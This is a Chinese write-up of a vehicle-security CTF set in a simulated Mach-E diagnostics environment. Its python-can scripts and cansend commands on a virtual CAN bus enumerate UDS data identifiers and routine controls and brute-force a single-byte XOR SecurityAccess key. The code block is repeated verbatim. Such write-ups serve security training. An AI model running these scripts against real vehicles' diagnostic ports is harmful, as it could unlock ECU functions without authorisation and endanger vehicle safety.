---
title: 【WriteUP】VSEC 车联网安全 CTF 挑战赛（三）
contest: VSEC
year: 2024
difficulty: medium
vuln_type: misc_unknown
tags:
- UDS-ReadDataByIdentifier-Service-0x22
- RoutineControl-Service-0x31
- SecurityAccess-Service-0x27-XOR
- single-byte-XOR-brute
- '0xc0ffe000'
- 0x7E0-TesterPresent
attack_chain: 1. Service 0x22 读数据 identifier 遍历 (0x03 0x22 i j)/2. Service 0x31 RoutineControl 遍历 (0x04 0x31 0x01 i j) 过滤 037f3131/3. Service 0x27 SecurityAccess 单字节 XOR 爆破 (0x02 0x11 0x01 reset + 0x02 0x27 0x01 seed) + (0x06 0x27 0x02 key1 key2 key3 key4)/4. 0x20 成功 seed ^ 0x20 = key/5. ReadMemory 0xc0ffe000 看 flag
key_payload: Service 0x22 i,j 遍历  Service 0x31 i,j RoutineControl  Service 0x27 单字节 XOR 爆破 0x20
one_liner: VSEC 车联网安全 CTF（三），UDS Service 0x22/0x31/0x27 全套诊断 + 单字节 XOR 爆破 SecurityAccess。
lesson: UDS Service 0x22 ReadDataByIdentifier 遍历 (DID, i, j) 找有效数据；0x31 RoutineControl 爆破 (routine_id, sub_func)；0x27 SecurityAccess 单字节 XOR 可 0x00-0xFF 爆破；0xc0ffe000 是典型蜜罐地址。
quality: high
full_path: 【WriteUP】VSEC_车联网安全_CTF_挑战赛（三）.full.md
meta_path: 【WriteUP】VSEC_车联网安全_CTF_挑战赛（三）.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 【WriteUP】VSEC 车联网安全 CTF 挑战赛（三）。VSEC 车联网安全 CTF（三），UDS Service 0x22/0x31/0x27 全套诊断 + 单字节 XOR 爆破 SecurityAccess。。经验：UDS Service 0x22 ReadDataByIdentifier 遍历 (DID, i, j) 找有效数据；0...
category: misc
subcategory: misc_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/197222.html
reasoning_chain:
- Mach-E User Space Diagnostics Challenge → 触发点：UDS 协议 Service ID → 假设：遍历 0x22 ReadDataByIdentifier
- 动作：can.Message(arbitration_id=0x7E0, data=[0x03, 0x22, i, j, ...]) 遍历 i,j 0..0xFF → 观察：响应含有效数据
- Service 0x31 RoutineControl → 触发点：31 01 是 routine sub-function → 动作：cansend vcan0 7E0#043101ij
- 观察：过滤 037f3131 响应 → 拿到有效 routine data
- Service 0x27 SecurityAccess → 触发点：27 01 seedRequest + 27 02 sendKey → 假设：单字节 XOR 可爆
- 动作：先 0x11 0x01 reset + 0x27 0x01 拿 seed → 0x27 0x02 试 key1..key4 → 观察：seed ^ 0x20 = key 成功
- UDS 0x23 ReadMemoryByAddress → 触发点：0xc0ffe000 是典型蜜罐地址 → 动作：cansend 7E0#0323c0ffe000
- 观察：响应含 flag → 完成
failed_attempts:
- 试图固定 seed/key 字符串 → 失败：必须按 0x27 协议 request/response 流程
- 试图爆破 0x22 全部 i,j → 太慢，限制到 0x00-0xFF 即可
- 试图不解 SecurityAccess 直接读 0x23 → 失败：被 security access 拒绝
key_observations:
- UDS Service 0x22 (ReadDataByIdentifier) 是 DID 读取入口
- UDS Service 0x31 (RoutineControl) 是子功能控制入口
- UDS Service 0x27 (SecurityAccess) 单字节 XOR 可 0x00-0xFF 爆破
- 0xc0ffe000 是汽车 CTF 蜜罐地址（coffee = 可可 = 测试）
- UDS 测试 ID 0x7E0 + 响应 ID 0x7E8 是诊断通信固定对
prerequisites:
- UDS 协议（ISO 14229）Service ID 体系
- can-utils / python-can 工具使用
- CAN 帧格式（arbitration_id + dlc + data）
- SecurityAccess 算法逆向（单字节 XOR 等）
---
# 【WriteUP】VSEC 车联网安全 CTF 挑战赛（三）

> 原文: https://www.ctfiot.com/197222.html
> ID: 197222

题目描述：This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E User Space Diagnostics Challenge Simulation, then launch the terminal.Can you identify the data?翻译：这项挑战在 VSEC 上的 Harborbay 车辆模拟器中进行。从主页进入 HarborBay。选择 Mach-E 用户空间诊断挑战模拟，然后启动终端。您能识别数据吗？

import canimport timeimport binascii
bus = can.Bus(interface='socketcan', channel='vcan0')
for i in range(0,0xFF): for j in range(0,0xFF): message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x03, 0x22, i, j, 0x00, 0x00, 0x00, 0x00]) bus.send(message, timeout=0.2) msg = bus.recv()
bus.shutdown()

cansend vcan0 7E0#03220008cansend vcan0 7E0#3000000000000000

题目描述：This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E User Space Diagnostics Challenge Simulation, then launch the terminal.I hear routine control has a lot of fun features.翻译：这项挑战在 VSEC 上的 Harborbay 车辆模拟器中进行。从主页进入 HarborBay。选择 Mach-E 用户空间诊断挑战模拟，然后启动终端。我听说常规控制有很多有趣的功能。

import canimport timeimport binascii
bus = can.Bus(interface='socketcan', channel='vcan0')bus.set_filters([{"can_id": 0x7E8, "can_mask": 0xFFF, "extended": False}])
for i in range(0,0xFF): for j in range(0,0xFF): time.sleep(0.01) message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x04, 0x31, 0x01, i, j, 0x00, 0x00, 0x00]) bus.send(message, timeout=0.2) msg = bus.recv() result = binascii.hexlify(msg.data).decode('utf-8') if result == "037f3131": pass else: print("i: ",hex(i)," j: ",hex(j))
bus.shutdown()

题目描述：This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E User Space Diagnostics Challenge Simulation, then launch the terminal.I hear single byte XOR keys are a great security measure, can you prove me wrong?翻译：此挑战在 VSEC 上的 Harborbay 车辆模拟器中进行。从主页进入 HarborBay。选择 Mach-E 用户空间诊断挑战模拟，然后启动终端。我听说单字节 XOR 密钥是一种很好的安全措施，你能证明我错了吗？

import canimport timeimport binascii
bus = can.Bus(interface='socketcan', channel='vcan0')bus.set_filters([{"can_id": 0x7E8, "can_mask": 0xFFF, "extended": False}])for key in range(0,0xFF): message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x02, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]) bus.send(message, timeout=0.2) msg = bus.recv() time.sleep(1) message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]) bus.send(message, timeout=0.2) msg = bus.recv()
 result = binascii.hexlify(msg.data).decode('utf-8') seed = result[6:14] key1 = int(seed[:2],16) ^ key key2 = int(seed[2:4],16) ^ key key3 = int(seed[4:6],16) ^ key key4 = int(seed[6:8],16) ^ key
 message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x06, 0x27, 0x02, key1, key2, key3, key4, 0x00]) bus.send(message, timeout=0.2) msg = bus.recv() result = binascii.hexlify(msg.data).decode('utf-8') if result == "037f2735": pass else: print("key: ",hex(key))
bus.shutdown()

import canimport timeimport binascii
bus = can.Bus(interface='socketcan', channel='vcan0')bus.set_filters([{"can_id": 0x7E8, "can_mask": 0xFFF, "extended": False}])
message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00])bus.send(message, timeout=0.2)msg = bus.recv()result = binascii.hexlify(msg.data).decode('utf-8')seed = result[6:14]key1 = int(seed[:2],16) ^ 0x20key2 = int(seed[2:4],16) ^ 0x20key3 = int(seed[4:6],16) ^ 0x20key4 = int(seed[6:8],16) ^ 0x20message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x06, 0x27, 0x02, key1, key2, key3, key4, 0x00])bus.send(message, timeout=0.2)msg = bus.recv()result = binascii.hexlify(msg.data).decode('utf-8')print(result)message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])bus.send(message, timeout=0.2)msg = bus.recv(timeout=0.2)result = binascii.hexlify(msg.data).decode('utf-8')print(result)msg = bus.recv(timeout=0.2)result = binascii.hexlify(msg.data).decode('utf-8')print(result)msg = bus.recv(timeout=0.2)result = binascii.hexlify(msg.data).decode('utf-8')print(result)msg = bus.recv(timeout=0.2)result = binascii.hexlify(msg.data).decode('utf-8')print(result)msg = bus.recv(timeout=0.2)result = binascii.hexlify(msg.data).decode('utf-8')print(result)bus.shutdown()

题目描述：This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E User Space Diagnostics Challenge Simulation, then launch the terminal.I wonder whats at 0xc0ffe000?翻译：此挑战在 VSEC 上的 Harborbay 车辆模拟器内进行。从主页进入 HarborBay。选择 Mach-E 用户空间诊断挑战模拟，然后启动终端。我想知道 0xc0ffe000 是什么？


```
题目描述：This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E User Space Diagnostics Challenge Simulation, then launch the terminal.Can you identify the data?翻译：这项挑战在 VSEC 上的 Harborbay 车辆模拟器中进行。从主页进入 HarborBay。选择 Mach-E 用户空间诊断挑战模拟，然后启动终端。您能识别数据吗？
import canimport timeimport binascii
bus = can.Bus(interface='socketcan', channel='vcan0')
for i in range(0,0xFF): for j in range(0,0xFF): message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x03, 0x22, i, j, 0x00, 0x00, 0x00, 0x00]) bus.send(message, timeout=0.2) msg = bus.recv()
bus.shutdown()
cansend vcan0 7E0#03220008cansend vcan0 7E0#3000000000000000
题目描述：This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E User Space Diagnostics Challenge Simulation, then launch the terminal.I hear routine control has a lot of fun features.翻译：这项挑战在 VSEC 上的 Harborbay 车辆模拟器中进行。从主页进入 HarborBay。选择 Mach-E 用户空间诊断挑战模拟，然后启动终端。我听说常规控制有很多有趣的功能。
import canimport timeimport binascii
bus = can.Bus(interface='socketcan', channel='vcan0')bus.set_filters([{"can_id": 0x7E8, "can_mask": 0xFFF, "extended": False}])
for i in range(0,0xFF): for j in range(0,0xFF): time.sleep(0.01) message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x04, 0x31, 0x01, i, j, 0x00, 0x00, 0x00]) bus.send(message, timeout=0.2) msg = bus.recv() result = binascii.hexlify(msg.data).decode('utf-8') if result == "037f3131": pass else: print("i: ",hex(i)," j: ",hex(j))
bus.shutdown()
题目描述：This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E User Space Diagnostics Challenge Simulation, then launch the terminal.I hear single byte XOR keys are a great security measure, can you prove me wrong?翻译：此挑战在 VSEC 上的 Harborbay 车辆模拟器中进行。从主页进入 HarborBay。选择 Mach-E 用户空间诊断挑战模拟，然后启动终端。我听说单字节 XOR 密钥是一种很好的安全措施，你能证明我错了吗？
import canimport timeimport binascii
bus = can.Bus(interface='socketcan', channel='vcan0')bus.set_filters([{"can_id": 0x7E8, "can_mask": 0xFFF, "extended": False}])for key in range(0,0xFF): message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x02, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]) bus.send(message, timeout=0.2) msg = bus.recv() time.sleep(1) message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]) bus.send(message, timeout=0.2) msg = bus.recv()
 result = binascii.hexlify(msg.data).decode('utf-8') seed = result[6:14] key1 = int(seed[:2],16) ^ key key2 = int(seed[2:4],16) ^ key key3 = int(seed[4:6],16) ^ key key4 = int(seed[6:8],16) ^ key
 message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x06, 0x27, 0x02, key1, key2, key3, key4, 0x00]) bus.send(message, timeout=0.2) msg = bus.recv() result = binascii.hexlify(msg.data).decode('utf-8') if result == "037f2735": pass else: print("key: ",hex(key))
bus.shutdown()
import canimport timeimport binascii
bus = can.Bus(interface='socketcan', channel='vcan0')bus.set_filters([{"can_id": 0x7E8, "can_mask": 0xFFF, "extended": False}])
message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00])bus.send(message, timeout=0.2)msg = bus.recv()result = binascii.hexlify(msg.data).decode('utf-8')seed = result[6:14]key1 = int(seed[:2],16) ^ 0x20key2 = int(seed[2:4],16) ^ 0x20key3 = int(seed[4:6],16) ^ 0x20key4 = int(seed[6:8],16) ^ 0x20message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x06, 0x27, 0x02, key1, key2, key3, key4, 0x00])bus.send(message, timeout=0.2)msg = bus.recv()result = binascii.hexlify(msg.data).decode('utf-8')print(result)message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])bus.send(message, timeout=0.2)msg = bus.recv(timeout=0.2)result = binascii.hexlify(msg.data).decode('utf-8')print(result)msg = bus.recv(timeout=0.2)result = binascii.hexlify(msg.data).decode('utf-8')print(result)msg = bus.recv(timeout=0.2)result = binascii.hexlify(msg.data).decode('utf-8')print(result)msg = bus.recv(timeout=0.2)result = binascii.hexlify(msg.data).decode('utf-8')print(result)msg = bus.recv(timeout=0.2)result = binascii.hexlify(msg.data).decode('utf-8')print(result)bus.shutdown()
题目描述：This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E User Space Diagnostics Challenge Simulation, then launch the terminal.I wonder whats at 0xc0ffe000?翻译：此挑战在 VSEC 上的 Harborbay 车辆模拟器内进行。从主页进入 HarborBay。选择 Mach-E 用户空间诊断挑战模拟，然后启动终端。我想知道 0xc0ffe000 是什么？
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]